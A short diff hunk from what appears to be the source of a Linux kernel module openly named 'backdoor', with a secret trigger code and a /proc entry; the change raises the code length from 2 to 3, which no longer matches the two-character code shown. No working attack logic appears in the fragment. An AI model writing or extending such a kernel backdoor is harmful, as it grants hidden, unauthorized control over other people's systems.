@@ -16,7 +16,7 @@ MODULE_VERSION("0.1");
 
 #define DEVICE_NAME "backdoor"
 #define SECRET_CODE "32"
-#define SECRET_CODE_LENGTH 2
+#define SECRET_CODE_LENGTH 3
 
 static struct proc_dir_entry *proc_entry;
 
